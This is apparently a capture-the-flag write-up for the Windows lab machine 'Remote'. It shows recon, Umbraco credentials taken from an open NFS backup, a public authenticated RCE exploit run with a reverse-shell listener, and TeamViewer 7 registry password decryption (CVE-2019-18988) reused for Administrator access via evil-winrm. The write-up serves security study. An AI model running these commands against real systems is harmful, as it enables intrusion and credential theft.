# Remote — Easy — Windows

**Date:** 10 July 2026

---

## Tags
`#windows` `#nfs` `#umbraco` `#cve-2019-18988` `#teamviewer` `#registry` `#credential-decryption` `#evil-winrm` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | 10.129.230.172                                                 |
| OS         | Windows                                                        |
| Open ports | 21, 80, 111, 135, 139, 445, 2049, 5985, 47001, 49664+          |
| Services   | FTP (anon, empty); IIS/Umbraco (80); NFS (2049); WinRM (5985)  |
| Web app    | Umbraco CMS 7.12.4                                             |
| Foothold   | NFS site_backups → Umbraco.sdf hash → crack → Umbraco auth RCE |
| User       | iis apppool\defaultapppool                                     |
| Privesc    | TeamViewer 7 registry password (CVE-2019-18988) → Administrator |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.230.172

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-09 18:03 +0100
Nmap scan report for 10.129.230.172
Host is up (0.030s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.95 seconds
```

<img width="865" height="662" alt="image" src="https://github.com/user-attachments/assets/7e8bb3d0-07f5-4bd3-bd5d-1b2ba0087c09" />

```
nmap -sC -sV -p21,80,111,135,139,445,2049,5985 10.129.230.172

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-09 18:09 +0100
Nmap scan report for 10.129.230.172
Host is up (0.016s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|_  100024  1           2049/tcp   status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.30 seconds
```

<img width="962" height="1168" alt="image" src="https://github.com/user-attachments/assets/2b09f0c9-2075-4106-a330-2ccf8bf4a92b" />

**What each port tells me:**
- **Port 21 (FTP)** — Microsoft ftpd, anonymous login allowed. First check, though it was discovered to be empty.
- **Port 80 (HTTP)** — an IIS-hosted site ("Acme Widgets"); the main web attack surface (later: Umbraco CMS).
- **Port 111 + 2049 (NFS)** — rpcbind and NFS. an exported NFS share is a prime spot for leaked files.
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper; confirms a standard Windows host.
- **Ports 139, 445 (SMB)** — another file-sharing surface to check.
- **Ports 5985 / 47001 (WinRM)** — Windows Remote Management. My route to a shell if I recover admin creds (evil-winrm).
- **Ports 49664–49680 (MSRPC)** — dynamic high RPC ports, normal Windows behaviour. Not targets themselves.

---

## Enumeration Log

```
OBSERVATION: Port 21 allows anonymous FTP login
WHAT IT TELLS ME: I can access the FTP share without a password
WHAT I AM GOING TO TRY: Log in anonymously and explore
WHY: Anonymous FTP is misconfigured and could expose files
RESULT: The share is empty, dead end
WHAT NEXT:
- Investigate the web app (function, tech stack)
- Directory-fuzz for hidden paths
- Analyse JS/source for anything useful
```

<img width="992" height="384" alt="image" src="https://github.com/user-attachments/assets/85e91ec8-563a-42c5-ae3a-d11517e9c045" />

```
OBSERVATION:
- The site is a shopping/company page ("Acme Widgets") with a few pages
- The Contact page shows an "Umbraco Forms is required to render this form..." message and the button
  leads to a login page, the app is built on Umbraco (a .NET CMS)
- Nothing notable from wappalyzer, dir fuzz, or source/JS
WHAT IT TELLS ME: I should research Umbraco for default creds and known vulnerabilities
WHAT I AM GOING TO TRY:
- Test Umbraco default credentials
- Research Umbraco CVEs
WHY: Default creds would grant access; a known CVE could give a foothold
RESULT:
- Default admin:test doesn't work
- Umbraco has an AUTHENTICATED RCE, so I first need valid credentials
WHAT NEXT:
- Two file-sharing services remain (SMB, NFS); enumerate them for leaked credentials
```

<img width="2170" height="871" alt="image" src="https://github.com/user-attachments/assets/287352b0-46d5-4400-a873-7db8081bf685" />

<img width="2195" height="1081" alt="image" src="https://github.com/user-attachments/assets/322e1940-ee71-4356-97b1-c695d072dd06" />

<img width="2504" height="359" alt="image" src="https://github.com/user-attachments/assets/033c30ca-9e16-4f1b-bfa7-9dca40f5d91f" />


```
OBSERVATION:
- SMB doesn't allow anonymous/null access
- NFS exports a share, /site_backups, mountable by everyone, I mounted it
- The share is a backup of the Umbraco site. Research shows Umbraco stores creds in
  App_Data/Umbraco.sdf
- .sdf tooling was unhelpful, but running strings on Umbraco.sdf revealed a username and a
  password hash
WHAT IT TELLS ME: If I can crack the hash, these are valid Umbraco logins (this IS the site's backup)
WHAT I AM GOING TO TRY: Crack the hash, log in, and confirm the Umbraco version against the RCE
WHY: Cracking the backup creds gets me into the live panel; the version tells me if the RCE applies
RESULT:
- Cracked the hash and logged into Umbraco with the recovered creds
- Confirmed the version (7.12.4) is vulnerable to the authenticated RCE
- Used the searchsploit exploit (49488.py, after some tweaking) to get code execution, landed a shell
  as iis apppool\defaultapppool and read user.txt
WHAT NEXT: Enumerate for a path to nt authority\system / Administrator
```

<img width="603" height="91" alt="image" src="https://github.com/user-attachments/assets/09012cbd-3fa4-4b21-ab69-88a4ab2cb643" />

<img width="2010" height="657" alt="image" src="https://github.com/user-attachments/assets/7c622b13-082e-434e-8c19-7ba4299dbd3e" />

<img width="786" height="229" alt="image" src="https://github.com/user-attachments/assets/cb67c181-12ef-4dbf-835e-a82bf83e21a8" />

<img width="2011" height="283" alt="image" src="https://github.com/user-attachments/assets/b0d479b2-e704-4573-a6fa-8e9c5323474b" />

<img width="2499" height="293" alt="image" src="https://github.com/user-attachments/assets/a608931c-8469-4403-ac80-c1c2f5555b8c" />

<img width="1433" height="578" alt="image" src="https://github.com/user-attachments/assets/8f15820f-8bfd-40ea-81a6-0d2caee99b3e" />

<img width="1235" height="361" alt="image" src="https://github.com/user-attachments/assets/57e79387-0f59-49ea-917b-d0f49a2b9c33" />

<img width="2534" height="279" alt="image" src="https://github.com/user-attachments/assets/88c4da81-dad7-481e-be26-234d8a5600ad" />

<img width="1011" height="310" alt="image" src="https://github.com/user-attachments/assets/d1069da2-6678-40fc-8521-e940e2327909" />

<img width="1006" height="258" alt="image" src="https://github.com/user-attachments/assets/1f9f7201-76c4-464a-bf90-6d2d43207524" />


```
OBSERVATION:
- The /Uers/Public/Desktop(TeamViewer 7.lnk) / installed software shows TeamViewer 7, an uncommon third-party app, and a good
  privesc vector; enumeration confirms TeamViewer 7 is running
- TeamViewer 7 (7.0.43148) is affected by CVE-2019-18988: it stores its password in the registry,
  AES-encrypted with a KNOWN, hardcoded key and IV so it's fully decryptable
- Found a script (whynotsecurity) that decrypts the stored value given the registry blob
WHAT IT TELLS ME: If I extract the encrypted blob from the registry, I can decrypt TeamViewer's
  password and since TeamViewer credentials are often reused, it may be the Administrator password
WHAT I AM GOING TO TRY:
- Read the encrypted password from HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
  (checking SecurityPasswordAES / OptionsPasswordAES / SecurityPasswordExported / ServerPasswordAES)
- Decrypt it with the known key/IV and try it against the Administrator account
WHY: The known-key flaw makes the stored password recoverable, and password reuse is common
RESULT:
- Read the blob from SecurityPasswordAES:
    (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7").SecurityPasswordAES -join ','
- Converted the decimal byte array to hex:
    echo "255,155,28,..." | tr ',' '\n' | while read n; do printf '%02x' "$n"; done; echo
- Decrypted the password with the script, then logged in via evil-winrm as Administrator and read root.txt
```

<img width="2355" height="208" alt="image" src="https://github.com/user-attachments/assets/88dd30e4-f18e-4650-ba2d-621d24b54935" />

<img width="952" height="756" alt="image" src="https://github.com/user-attachments/assets/979c9e99-526e-4468-a307-59238cda4229" />

<img width="1299" height="587" alt="image" src="https://github.com/user-attachments/assets/9206db52-8d9d-4693-9b1a-4e1ed6a36a39" />

<img width="1667" height="861" alt="image" src="https://github.com/user-attachments/assets/c6d2766e-6da1-496a-aede-6ac9f9fe8c3d" />

<img width="1069" height="173" alt="image" src="https://github.com/user-attachments/assets/f0c114af-0eb4-4599-ba96-d8f71b77a2ae" />

<img width="2450" height="108" alt="image" src="https://github.com/user-attachments/assets/95d12a99-aa8c-4d0a-8dc2-489bb73f7d72" />

<img width="1803" height="546" alt="image" src="https://github.com/user-attachments/assets/c4094fec-ef15-4c51-9ea7-fbd195a10e13" />

---

## Foothold

**How I got in:** FTP was anonymous but empty, and SMB was locked down but **NFS** (port 2049) exported a `site_backups` share mountable by anyone. It contained a backup of the Umbraco site, and `App_Data/Umbraco.sdf` held an admin username and password hash (readable via `strings`). I cracked the hash, logged into the live Umbraco panel, confirmed version **7.12.4**, and used its **authenticated RCE** to get a shell as `iis apppool\defaultapppool`.

**Command / exploit used:**
```
# discover and mount the NFS export
showmount -e 10.129.230.172
sudo mount -t nfs 10.129.230.172:/site_backups /mnt/remote

# recover creds from the Umbraco DB backup
strings /mnt/remote/App_Data/Umbraco.sdf | less     # → admin@htb.local + SHA1 hash
# crack the SHA1 hash (hashcat -m 100 / john / hashes.com)

# authenticated Umbraco RCE (searchsploit 49488.py, edited for creds + reverse shell)
python3 49488.py -u admin@htb.local -p '<cracked>' -i http://10.129.230.172 -c powershell -a "<revshell>"
nc -lnvp <LPORT>          # → shell as iis apppool\defaultapppool
```

**Why it worked:** An NFS export left readable by everyone leaked the site's entire backup, including the CMS database with an admin hash. Once cracked, those credentials satisfied Umbraco 7.12.4's authenticated RCE (a template/XSLT injection that runs C# on the server) so a leaked backup turned into code execution.

---

## Privilege Escalation

**Path taken (defaultapppool → Administrator):** Installed-software enumeration showed **TeamViewer 7** running an unusual third-party app. TeamViewer 7 (7.0.43148) is affected by **CVE-2019-18988**: it stores its account password in the registry, AES-128-CBC encrypted with a **hardcoded, publicly known key and IV**, making it trivially decryptable. I read the encrypted blob from `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7` (the `SecurityPasswordAES` value), converted the decimal byte array to hex, and decrypted it with a public script. The recovered password was reused for the **Administrator** account, so I logged in over WinRM with evil-winrm and read root.txt.

```
# extract the encrypted password from the registry
(Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7").SecurityPasswordAES -join ','
# convert decimal bytes → hex, then decrypt with the known AES key/IV (whynotsecurity script)
# finally:
evil-winrm -i 10.129.230.172 -u administrator -p '<decrypted password>'
```

**Why it worked:** TeamViewer 7 protected its stored password with a fixed, published key/IV "encryption" that anyone with the ciphertext can reverse. Reading it required only the low-priv foothold's registry access. The final step was pure password reuse: the TeamViewer password was also the Administrator's, so decrypting one credential handed over the whole box.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Mounted an open NFS `site_backups` share, pulled an Umbraco admin hash from `Umbraco.sdf` with `strings`, cracked it, and used Umbraco 7.12.4's authenticated RCE for a shell as the IIS app-pool user.
2. **Privesc technique in one sentence:** Decrypted TeamViewer 7's registry-stored password (CVE-2019-18988, known AES key/IV) and reused it to log in as Administrator over WinRM.
